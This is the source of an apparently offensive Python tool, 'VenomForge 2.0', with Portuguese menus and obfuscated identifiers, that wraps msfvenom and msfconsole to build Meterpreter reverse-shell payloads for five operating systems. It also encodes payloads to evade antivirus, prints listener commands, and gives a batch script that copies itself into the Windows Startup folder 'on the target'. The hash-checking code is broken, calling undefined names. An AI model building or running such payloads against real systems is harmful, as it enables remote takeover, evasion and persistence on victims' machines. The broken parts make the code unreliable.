#!/usr/bin/env python3
# VenomForge 2.0 - Gerador Avançado de Payloads
# Autor: Therac-25 

import os
import sys
import subprocess
from time import sleep
import hashlib

try:
    from prettytable import PrettyTable
except ImportError:
    print("O módulo 'prettytable' não está instalado. Execute: pip install prettytable")
    sys.exit(1)

class zykeOzFxVpcs:
    RED = '\x1b[38;5;196m'
    ORANGE = '\x1b[38;5;208m'
    YELLOW = '\x1b[38;5;226m'
    GREEN = '\x1b[38;5;46m'
    BLUE = '\x1b[38;5;45m'
    PURPLE = '\x1b[38;5;129m'
    PINK = '\x1b[38;5;201m'
    WHITE = '\x1b[38;5;255m'
    RESET = '\x1b[0m'

def wLAqCrdlTgeK():
    os.system('cls' if os.name == 'nt' else 'clear')

def WOVEpClfvXkF():
    print(zykeOzFxVpcs.PURPLE + '\n                         __    _\n                    _wr""        "-q__\n                 _dP                 9m_\n               _#P                     9#_\n              d#@                       9#m\n             d##                         ###\n            J###                         ###L\n            {###K                       J###K\n            ]####K      ___aaa___      J####F\n        __gmM######_  w#P""   ""9#m  _d#####Mmw__\n     _g##############mZ_         __g##############m_\n   _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_\n  a###""          ,Z"#####@" \'######"\\g          ""M##m\n J#@"             0L  "*##     ##@"  J#              *#K\n #"               `#    "_gmwgm_~    dF               `#_\n7F                 "#_   ]#####F   _dK                 JE\n]                    *m__ ##### __g@"                   F\n                       "PJ#####LP"\n `                       0######_                      \'\n                       _0########_\n     .               _d#####^#####m__              ,\n      "*w_________am#####P"   ~9#####mw_________w*"\n          ""9@#####@M""           ""P@#####@M""\n' + zykeOzFxVpcs.RESET)
    print(f'{zykeOzFxVpcs.YELLOW}          VenomForge 2.0 - Gerador Avançado de Payloads{zykeOzFxVpcs.RESET}')
    print(f'{zykeOzFxVpcs.BLUE}          ---------------------------------------------{zykeOzFxVpcs.RESET}\n')

def NhxGHQMmOmCN(text, color=zykeOzFxVpcs.WHITE, delay=0.05):
    for WlhcefdQfUhp in text:
        print(color + WlhcefdQfUhp, end='', flush=True)
        sleep(delay)
    print(zykeOzFxVpcs.RESET)

def wfiIdlYDUBbd():
    KPRdteheWkhs = ['msfvenom', 'nmap']
    HPnvBVnQwDzz = []
    oWDrBCSkOdGw = 'where' if os.name == 'nt' else 'which'
    for uFhHISYXjoJb in KPRdteheWkhs:
        if not os.popen(f'{oWDrBCSkOdGw} {uFhHISYXjoJb}').read().strip():
            HPnvBVnQwDzz.append(uFhHISYXjoJb)
    if HPnvBVnQwDzz:
        print(f'{zykeOzFxVpcs.RED}Dependências ausentes:{zykeOzFxVpcs.RESET}')
        for uFhHISYXjoJb in HPnvBVnQwDzz:
            print(f'- {uFhHISYXjoJb}')
        return False
    return True

def LOmdEbdPCfBs():
    zIZUGrMVPrjc = PrettyTable()
    zIZUGrMVPrjc.field_names = [f'{zykeOzFxVpcs.GREEN}Interface{zykeOzFxVpcs.RESET}', f'{zykeOzFxVpcs.BLUE}Endereço IP{zykeOzFxVpcs.RESET}', f'{zykeOzFxVpcs.PURPLE}Status{zykeOzFxVpcs.RESET}']
    zIZUGrMVPrjc.add_row(['eth0', '192.168.1.100', 'Ativa'])
    zIZUGrMVPrjc.add_row(['wlan0', '10.0.0.15', 'Ativa'])
    zIZUGrMVPrjc.add_row(['tun0', '172.16.0.1', 'Ativa'])
    print(f'\n{zykeOzFxVpcs.YELLOW}Interfaces de rede disponíveis:{zykeOzFxVpcs.RESET}')
    print(zIZUGrMVPrjc)

def GaHaaDZObCUx():
    wLAqCrdlTgeK()
    WOVEpClfvXkF()
    print(f'{zykeOzFxVpcs.PURPLE}>>> VERIFICADOR DE HASH DE ARQUIVO <<<{zykeOzFxVpcs.RESET}')
    FCYOgJohamVb = input('Digite o caminho do arquivo para verificar o hash: ').strip()
    if not os.path.isfile(FCYOgJohamVb):
        print(f'{zykeOzFxVpcs.RED}Arquivo não encontrado!{zykeOzFxVpcs.RESET}')
        sleep(1)
        return
    print(f'\n{zykeOzFxVpcs.YELLOW}MD5: {get_hash(FCYOgJohamVb, 'md5')}{zykeOzFxVpcs.RESET}')
    print(f'{zykeOzFxVpcs.YELLOW}SHA1: {get_hash(FCYOgJohamVb, 'sha1')}{zykeOzFxVpcs.RESET}')
    print(f'{zykeOzFxVpcs.YELLOW}SHA256: {get_hash(FCYOgJohamVb, 'sha256')}{zykeOzFxVpcs.RESET}')
    input(f'\n{zykeOzFxVpcs.BLUE}Pressione Enter para voltar...{zykeOzFxVpcs.RESET}')

def TbNNxqRpTEuo(file_path, hash_type):
    UOoeaEFxlUIY = hashlib.new(hash_type)
    with open(FCYOgJohamVb, 'rb') as zhejZGjyqChp:
        while True:
            ywsqgSbakCAr = zhejZGjyqChp.read(4096)
            if not ywsqgSbakCAr:
                break
            UOoeaEFxlUIY.update(ywsqgSbakCAr)
    return UOoeaEFxlUIY.hexdigest()

def zGPASEdKZtZy():
    wLAqCrdlTgeK()
    WOVEpClfvXkF()
    print(f'{zykeOzFxVpcs.PURPLE}>>> ENCODER DE PAYLOAD <<<{zykeOzFxVpcs.RESET}')
    FCYOgJohamVb = input('Digite o caminho do payload para encodar: ').strip()
    if not os.path.isfile(FCYOgJohamVb):
        print(f'{zykeOzFxVpcs.RED}Arquivo não encontrado!{zykeOzFxVpcs.RESET}')
        sleep(1)
        return
    print('Escolha um encoder:')
    pKNopDNSqxdr = {1: 'x86/shikata_ga_nai', 2: 'x86/countdown', 3: 'x86/jmp_call_additive', 4: 'Nenhum (voltar)'}
    for SlMzjCpoJZZw, QneZealJGjnQ in pKNopDNSqxdr.items():
        print(f'[{SlMzjCpoJZZw}] {QneZealJGjnQ}')
    try:
        oXBUxJwwacLu = int(input('Encoder: '))
        if oXBUxJwwacLu == 4:
            return
        gNOqItQeghdn = pKNopDNSqxdr.get(oXBUxJwwacLu)
        if not gNOqItQeghdn:
            print(f'{zykeOzFxVpcs.RED}Opção inválida!{zykeOzFxVpcs.RESET}')
            sleep(1)
            return
        ACVPKZowynnp = input('Nome para o novo arquivo encodado (ex: encoded_payload.exe): ').strip()
        if not ACVPKZowynnp:
            ACVPKZowynnp = 'encoded_' + os.path.basename(FCYOgJohamVb)
        oWDrBCSkOdGw = ['msfvenom', '-e', gNOqItQeghdn, '-i', '3', '-f', 'exe', '-o', ACVPKZowynnp, '-x', FCYOgJohamVb]
        try:
            eOCKBmQQFuOL = subprocess.run(oWDrBCSkOdGw, capture_output=True, text=True)
            if eOCKBmQQFuOL.returncode == 0:
                print(f'{zykeOzFxVpcs.YELLOW}\nPayload encodado salvo em: {ACVPKZowynnp}{zykeOzFxVpcs.RESET}')
            else:
                print(f'{zykeOzFxVpcs.RED}\nErro ao encodar!{zykeOzFxVpcs.RESET}')
                print(eOCKBmQQFuOL.stderr)
        except Exception as e:
            print(f'{zykeOzFxVpcs.RED}Falha ao executar msfvenom: {e}{zykeOzFxVpcs.RESET}')
        input(f'\n{zykeOzFxVpcs.BLUE}Pressione Enter para continuar...{zykeOzFxVpcs.RESET}')
    except ValueError:
        print(f'{zykeOzFxVpcs.RED}Por favor, digite um número!{zykeOzFxVpcs.RESET}')
        sleep(1)

def gmDOJwnXIobO():
    wLAqCrdlTgeK()
    WOVEpClfvXkF()
    print(f'{zykeOzFxVpcs.PURPLE}>>> SCRIPT BÁSICO DE PERSISTÊNCIA <<<{zykeOzFxVpcs.RESET}')
    print(f'{zykeOzFxVpcs.YELLOW}Este é um exemplo simples para Windows (bat):{zykeOzFxVpcs.RESET}\n')
    print('\n@echo off\ncopy %~f0 "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\venom.bat"\n')
    print('\nColoque o payload no mesmo local do script (.bat) e execute no alvo.')
    input(f'\n{zykeOzFxVpcs.BLUE}Pressione Enter para voltar...{zykeOzFxVpcs.RESET}')

def bPEuYlQwmsDO(target):
    wLAqCrdlTgeK()
    WOVEpClfvXkF()
    print(f'{zykeOzFxVpcs.PURPLE}>>> GERAÇÃO DE PAYLOAD - {target.upper()} <<<{zykeOzFxVpcs.RESET}\n')
    iIIatZFrZbaN = {'Windows': {'payload': 'windows/meterpreter/reverse_tcp', 'ext': 'exe', 'desc': 'Meterpreter Reverse TCP para Windows'}, 'Linux': {'payload': 'linux/x64/meterpreter/reverse_tcp', 'ext': 'elf', 'desc': 'Meterpreter Reverse TCP para Linux'}, 'Android': {'payload': 'android/meterpreter/reverse_tcp', 'ext': 'apk', 'desc': 'Meterpreter Reverse TCP para Android'}, 'MacOS': {'payload': 'osx/x64/meterpreter_reverse_tcp', 'ext': 'macho', 'desc': 'Meterpreter Reverse TCP para MacOS'}, 'iOS': {'payload': 'apple_ios/aarch64/meterpreter_reverse_tcp', 'ext': 'bin', 'desc': 'Meterpreter Reverse TCP para iOS'}}
    if target not in iIIatZFrZbaN:
        print(f'{zykeOzFxVpcs.RED}Payload não implementado para este alvo.{zykeOzFxVpcs.RESET}')
        sleep(2)
        return
    RLpbijSdCqVz = input(f'{zykeOzFxVpcs.YELLOW}Informe o LHOST (IP para receber a conexão): {zykeOzFxVpcs.RESET}').strip()
    weQeRPQuuhoY = input(f'{zykeOzFxVpcs.YELLOW}Informe o LPORT (porta de escuta): {zykeOzFxVpcs.RESET}').strip()
    ACVPKZowynnp = input(f'{zykeOzFxVpcs.YELLOW}Nome para o arquivo do payload (padrão: venom.{iIIatZFrZbaN[target]['ext']}): {zykeOzFxVpcs.RESET}').strip()
    if not ACVPKZowynnp:
        ACVPKZowynnp = f'venom.{iIIatZFrZbaN[target]['ext']}'
    print(f'\n{zykeOzFxVpcs.GREEN}Gerando payload {iIIatZFrZbaN[target]['desc']}...{zykeOzFxVpcs.RESET}')
    bXKkbRPBbTAh = ['msfvenom', '-p', iIIatZFrZbaN[target]['payload'], 'LHOST=' + RLpbijSdCqVz, 'LPORT=' + weQeRPQuuhoY, '-o', ACVPKZowynnp]
    try:
        eOCKBmQQFuOL = subprocess.run(bXKkbRPBbTAh, capture_output=True, text=True)
        if eOCKBmQQFuOL.returncode == 0:
            print(f'{zykeOzFxVpcs.YELLOW}\nPayload gerado com sucesso: {ACVPKZowynnp}{zykeOzFxVpcs.RESET}')
            print(f'{zykeOzFxVpcs.GREEN}\nComando para usar no msfconsole:{zykeOzFxVpcs.RESET}')
            print(f'{zykeOzFxVpcs.BLUE}use exploit/multi/handler')
            print(f'set PAYLOAD {iIIatZFrZbaN[target]['payload']}')
            print(f'set LHOST {RLpbijSdCqVz}')
            print(f'set LPORT {weQeRPQuuhoY}')
            print('run' + zykeOzFxVpcs.RESET)
            print(f'\n{zykeOzFxVpcs.YELLOW}Comando completo para colar:{zykeOzFxVpcs.RESET}')
            print(f"msfconsole -x 'use exploit/multi/handler; set PAYLOAD {iIIatZFrZbaN[target]['payload']}; set LHOST {RLpbijSdCqVz}; set LPORT {weQeRPQuuhoY}; run'")
        else:
            print(f'{zykeOzFxVpcs.RED}\nErro ao gerar o payload!{zykeOzFxVpcs.RESET}')
            print(eOCKBmQQFuOL.stderr)
    except Exception as e:
        print(f'{zykeOzFxVpcs.RED}Falha ao executar o msfvenom: {e}{zykeOzFxVpcs.RESET}')
    input(f'\n{zykeOzFxVpcs.BLUE}Pressione Enter para continuar...{zykeOzFxVpcs.RESET}')

def XDlrpFrwrxvG():
    wLAqCrdlTgeK()
    WOVEpClfvXkF()
    print(f'\n{zykeOzFxVpcs.PURPLE}>>> MENU DE ESCUTA <<<{zykeOzFxVpcs.RESET}')
    print(f'{zykeOzFxVpcs.YELLOW}Você pode criar o comando e copiar para o msfconsole:{zykeOzFxVpcs.RESET}')
    NmbfiPwvaFWV = input('PAYLOAD (ex: windows/meterpreter/reverse_tcp): ').strip()
    RLpbijSdCqVz = input('LHOST (IP): ').strip()
    weQeRPQuuhoY = input('LPORT (porta): ').strip()
    print(f'\n{zykeOzFxVpcs.GREEN}Comando para colar:{zykeOzFxVpcs.RESET}')
    print(f'{zykeOzFxVpcs.BLUE}use exploit/multi/handler')
    print(f'set PAYLOAD {NmbfiPwvaFWV}')
    print(f'set LHOST {RLpbijSdCqVz}')
    print(f'set LPORT {weQeRPQuuhoY}')
    print('run' + zykeOzFxVpcs.RESET)
    print(f'\n{zykeOzFxVpcs.YELLOW}Comando completo para colar:{zykeOzFxVpcs.RESET}')
    print(f"msfconsole -x 'use exploit/multi/handler; set PAYLOAD {NmbfiPwvaFWV}; set LHOST {RLpbijSdCqVz}; set LPORT {weQeRPQuuhoY}; run'")
    input(f'\n{zykeOzFxVpcs.BLUE}Pressione Enter para voltar...{zykeOzFxVpcs.RESET}')

def OjJvfqTDRcpN():
    while True:
        wLAqCrdlTgeK()
        WOVEpClfvXkF()
        print(f'\n{zykeOzFxVpcs.PURPLE}>>> UTILITÁRIOS DE PAYLOAD <<<{zykeOzFxVpcs.RESET}')
        print(f'{zykeOzFxVpcs.GREEN}[1] Encoder de Payload')
        print(f'{zykeOzFxVpcs.GREEN}[2] Verificador de Hash')
        print(f'{zykeOzFxVpcs.GREEN}[3] Script de Persistência')
        print(f'{zykeOzFxVpcs.RED}[4] Voltar ao Menu Principal{zykeOzFxVpcs.RESET}')
        try:
            oXBUxJwwacLu = int(input('\nSelecione uma opção: '))
            if oXBUxJwwacLu == 1:
                zGPASEdKZtZy()
            elif oXBUxJwwacLu == 2:
                GaHaaDZObCUx()
            elif oXBUxJwwacLu == 3:
                gmDOJwnXIobO()
            elif oXBUxJwwacLu == 4:
                return
            else:
                print(f'{zykeOzFxVpcs.RED}Opção inválida!{zykeOzFxVpcs.RESET}')
                sleep(1)
        except ValueError:
            print(f'{zykeOzFxVpcs.RED}Por favor, digite um número!{zykeOzFxVpcs.RESET}')
            sleep(1)

def qBPmDbwoGrXu():
    wLAqCrdlTgeK()
    WOVEpClfvXkF()
    print(f'\n{zykeOzFxVpcs.PURPLE}>>> GERENCIAMENTO DE SESSÕES <<<{zykeOzFxVpcs.RESET}')
    print(f'{zykeOzFxVpcs.YELLOW}Listando sessões ativas do Metasploit (necessário msfconsole rodando)...{zykeOzFxVpcs.RESET}')
    try:
        eOCKBmQQFuOL = subprocess.run(['msfconsole', '-x', 'sessions -l; exit'], capture_output=True, text=True)
        print(eOCKBmQQFuOL.stdout)
    except Exception as e:
        print(f'{zykeOzFxVpcs.RED}Erro ao executar msfconsole: {e}{zykeOzFxVpcs.RESET}')
    input(f'\n{zykeOzFxVpcs.BLUE}Pressione Enter para voltar...{zykeOzFxVpcs.RESET}')

def JfmnfLwVDGQJ():
    while True:
        wLAqCrdlTgeK()
        WOVEpClfvXkF()
        print(f'{zykeOzFxVpcs.PURPLE}\n>>> MENU DE GERAÇÃO DE PAYLOAD <<<{zykeOzFxVpcs.RESET}')
        bbGFlWtQqkOd = {1: 'Windows', 2: 'Linux', 3: 'Android', 4: 'MacOS', 5: 'iOS', 99: 'Voltar ao Menu Principal'}
        for qFZGCwggdDWI, corExduftOXK in bbGFlWtQqkOd.items():
            if qFZGCwggdDWI == 99:
                print(f'{zykeOzFxVpcs.RED}[{qFZGCwggdDWI}] {corExduftOXK}{zykeOzFxVpcs.RESET}')
            else:
                print(f'{zykeOzFxVpcs.GREEN}[{qFZGCwggdDWI}] {zykeOzFxVpcs.BLUE}{corExduftOXK}{zykeOzFxVpcs.RESET}')
        try:
            ElRzjxcbDZPA = int(input(f'\n{zykeOzFxVpcs.YELLOW}Selecione o sistema operacional alvo: {zykeOzFxVpcs.RESET}'))
            if ElRzjxcbDZPA in bbGFlWtQqkOd:
                if ElRzjxcbDZPA == 99:
                    return
                else:
                    bPEuYlQwmsDO(bbGFlWtQqkOd[ElRzjxcbDZPA])
            else:
                print(f'{zykeOzFxVpcs.RED}Opção inválida!{zykeOzFxVpcs.RESET}')
                sleep(1)
        except ValueError:
            print(f'{zykeOzFxVpcs.RED}Por favor, digite um número!{zykeOzFxVpcs.RESET}')
            sleep(1)

def njJpeIPWApXK():
    while True:
        wLAqCrdlTgeK()
        WOVEpClfvXkF()
        print(f'{zykeOzFxVpcs.ORANGE}\n[1] {zykeOzFxVpcs.GREEN}Gerar Payload{zykeOzFxVpcs.ORANGE}\n[2] {zykeOzFxVpcs.GREEN}Iniciar Listener{zykeOzFxVpcs.ORANGE}\n[3] {zykeOzFxVpcs.GREEN}Utilitários de Payload{zykeOzFxVpcs.ORANGE}\n[4] {zykeOzFxVpcs.GREEN}Gerenciamento de Sessões{zykeOzFxVpcs.ORANGE}\n[5] {zykeOzFxVpcs.RED}Sair{zykeOzFxVpcs.RESET}')
        try:
            oXBUxJwwacLu = int(input(f'\n{zykeOzFxVpcs.BLUE}Selecione uma opção: {zykeOzFxVpcs.RESET}'))
            if oXBUxJwwacLu == 1:
                JfmnfLwVDGQJ()
            elif oXBUxJwwacLu == 2:
                XDlrpFrwrxvG()
            elif oXBUxJwwacLu == 3:
                OjJvfqTDRcpN()
            elif oXBUxJwwacLu == 4:
                qBPmDbwoGrXu()
            elif oXBUxJwwacLu == 5:
                print(f'\n{zykeOzFxVpcs.YELLOW}Até logo! Boas invasões!{zykeOzFxVpcs.RESET}\n')
                sys.exit(0)
            else:
                print(f'{zykeOzFxVpcs.RED}\nOpção inválida! Tente novamente.{zykeOzFxVpcs.RESET}')
                sleep(1)
        except ValueError:
            print(f'{zykeOzFxVpcs.RED}\nPor favor, digite um número válido!{zykeOzFxVpcs.RESET}')
            sleep(1)
if __name__ == '__main__':
    try:
        if not wfiIdlYDUBbd():
            print(f'\n{zykeOzFxVpcs.RED}Algumas ferramentas necessárias estão ausentes. Instale-as primeiro.{zykeOzFxVpcs.RESET}')
            sys.exit(1)
        wLAqCrdlTgeK()
        NhxGHQMmOmCN('Inicializando VenomForge 2.0...', zykeOzFxVpcs.PURPLE)
        sleep(1)
        njJpeIPWApXK()
    except KeyboardInterrupt:
        print(f'\n{zykeOzFxVpcs.RED}Interrompido pelo usuário. Saindo...{zykeOzFxVpcs.RESET}')
        sys.exit(0)